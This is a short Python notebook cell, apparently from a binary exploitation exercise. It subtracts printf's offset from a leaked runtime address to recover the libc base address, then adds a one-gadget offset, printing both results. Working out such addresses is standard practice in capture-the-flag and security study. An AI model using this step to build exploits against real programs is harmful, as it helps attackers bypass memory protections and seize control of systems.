# %%
printf_runtime_addr = 0x7FFFF7E09100
offset = 0xEF52B
printf_offset = 0x60100
base_addr = printf_runtime_addr - printf_offset
print(f"Base address: {hex(base_addr)}")
print(f"One gadget address: {hex(base_addr + offset)}")
# Out:
# Base address: 0x7ffff7da9000
# One gadget address: 0x7ffff7e9852b
